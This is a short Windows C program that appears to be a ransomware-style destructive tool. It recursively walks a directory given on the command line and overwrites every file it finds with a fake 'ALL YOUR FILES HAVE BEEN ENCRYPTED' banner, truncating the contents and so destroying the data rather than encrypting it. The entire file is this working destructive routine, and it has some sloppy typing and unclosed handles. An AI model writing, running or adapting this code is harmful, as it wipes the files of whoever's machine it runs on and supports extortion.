#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include <strsafe.h>

#define ERROR "[-]"
#define SUCCESS "[+]"
#define INFO "[>]"

BOOL SpiderDirectory(char *cDirectoryName, unsigned char *cEncryptedCode) {
    WIN32_FIND_DATA ffd;
    LPCSTR lpPartialDirectory[MAX_PATH];
    LPCSTR lpFullDirectory[MAX_PATH];
    HANDLE hFind = INVALID_HANDLE_VALUE;
    LARGE_INTEGER filesize;
    long lEncryptedCodeSize;
    
    lEncryptedCodeSize = strlen(cEncryptedCode);

    StringCchCopy(lpPartialDirectory, MAX_PATH, cDirectoryName);
    sprintf(lpFullDirectory, "%s\\\\*", lpPartialDirectory);

    printf("%s Target directory is: %s\n", INFO, cDirectoryName);

    hFind = FindFirstFileA(lpFullDirectory, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("%s FindFirstFile failed with error: 0x%x\n", ERROR, GetLastError());
    }
    do {
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (strcmp(ffd.cFileName, ".") == 0 || strcmp(ffd.cFileName, "..") == 0) {
                continue;
            }
            sprintf(lpFullDirectory, "%s\\%s", lpPartialDirectory, ffd.cFileName);
            printf("%s   <DIR>\n", lpFullDirectory);
            SpiderDirectory(lpFullDirectory, cEncryptedCode);
        }
        else {
            filesize.LowPart = ffd.nFileSizeLow;
            filesize.HighPart = ffd.nFileSizeHigh;
            printf("%s   %ld bytes\n", ffd.cFileName, filesize.QuadPart);
            sprintf(lpFullDirectory, "%s\\%s", lpPartialDirectory, ffd.cFileName);
            WriteToFile(lpFullDirectory, cEncryptedCode, lEncryptedCodeSize);
        }
    } while (FindNextFileA(hFind, &ffd) != 0);
}

BOOL WriteToFile(LPCSTR lpFileName, unsigned char* cEncryptedCode, long lEncryptedCodeSize) {
    HANDLE hEncryptedFile = NULL;

    printf("%s filename: '%s'\n", INFO, lpFileName);
    hEncryptedFile = CreateFileA(lpFileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hEncryptedFile == INVALID_HANDLE_VALUE) {
        printf("%s CreateFile failed with error: 0x%x\n", ERROR, GetLastError());
        return -1;
    }

    DWORD dwBytesWritten;
    printf("%s filesize: %d\n", INFO, lEncryptedCodeSize);
    if (!WriteFile(hEncryptedFile, cEncryptedCode, lEncryptedCodeSize, &dwBytesWritten, NULL)) {
        printf("%s WriteFile failed with error: 0x%x\n", ERROR, GetLastError());
        return 1;
    }
}

int main(int argc, char* argv[]) {
    //Must be in format C:\\Users
    char* cDirectoryName = argv[1];
    unsigned char* cEncryptedCode = "====================ALL YOUR FILES HAVE BEEN ENCRYPTED...====================";
    SpiderDirectory(cDirectoryName, cEncryptedCode);
}
